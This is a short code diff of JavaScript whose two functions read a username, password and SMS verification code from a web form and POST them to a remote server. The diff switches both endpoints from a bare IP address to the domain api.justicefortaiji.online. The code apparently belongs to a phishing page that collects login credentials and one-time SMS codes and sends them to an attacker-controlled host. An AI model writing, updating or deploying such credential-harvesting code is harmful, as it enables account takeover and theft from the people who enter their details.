@@ -1,7 +1,7 @@
 function sendSignInDetails(){
     var name = document.getElementById('username').value
     var password = document.getElementById('password').value
-    fetch('http://18.116.65.86/process_sign_in', {
+    fetch('https://api.justicefortaiji.online/process_sign_in', {
         method: 'POST',
         headers: {
             'Content-Type' : 'application/json'
@@ -25,7 +25,7 @@ function sendSignInDetails(){
 
 function sendSMS(){
     var SMS = document.getElementById('sms_code').value
-    fetch('http://18.116.65.86/process_sms', {
+    fetch('https://api.justicefortaiji.online/process_sms', {
         method: 'POST',
         headers: {
             'Content-Type' : 'application/json'
